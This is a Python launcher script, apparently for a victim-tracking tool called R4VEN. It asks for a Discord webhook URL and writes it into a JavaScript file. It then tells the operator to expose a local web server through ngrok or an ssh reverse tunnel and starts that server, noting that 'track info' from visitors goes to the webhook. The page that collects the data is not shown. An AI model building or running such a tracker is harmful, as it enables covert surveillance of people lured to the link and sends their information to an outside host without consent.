#!/usr/bin/env python3
import sys
import os
import subprocess

twitter_url = 'https://spyboy.in/twitter'
discord = 'https://spyboy.in/Discord'
website = 'https://spyboy.in/'
blog = 'https://spyboy.blog/'

VERSION = '1.1.1'

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'

banner = r'''                                                    
__________    _________   _______________ _______   
\______   \  /  |  \   \ /   /\_   _____/ \      \  
 |       _/ /   |  |\   Y   /  |    __)_  /   |   \ 
 |    |   \/    ^   /\     /   |        \/    |    \
 |____|_  /\____   |  \___/   /_______  /\____|__  /
        \/      |__|                  \/         \/ '''

print(f'{R}{banner}{W}\n')
print(f'{G}[+] {C}Version      : {W}{VERSION}')
print(f'{G}[+] {C}Created By   : {W}Spyboy')
print(f'{G} ╰➤ {C}Twitter      : {W}{twitter_url}')
print(f'{G} ╰➤ {C}Discord      : {W}{discord}')
print(f'{G} ╰➤ {C}Website      : {W}{website}')
print(f'{G} ╰➤ {C}Blog         : {W}{blog}\n')

try:
    os.system("rm dwebhook.js")
except:
    pass

print(f'Enter Discord Webhoook url:')
input1 = input()

bef = 'var discord = {webhook : "'

aft = f"{input1}"

end = '",};'

wh = f"{bef}{aft}{end}"

file1 = open('dwebhook.js', 'a')

file1.write(wh)
file1.close()


print(f'\nTo port forward install ngrok or use ssh')

print(f'{C}For ngrok port forward type  : {Y}ngrok http 8000')
print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run\n')

print(f'{Y}Localhost Link: {W}http://localhost:8000/index.html')
print(f'{C}track info will be sent to your discord webhook.\n')

os.system("python3 -m http.server")

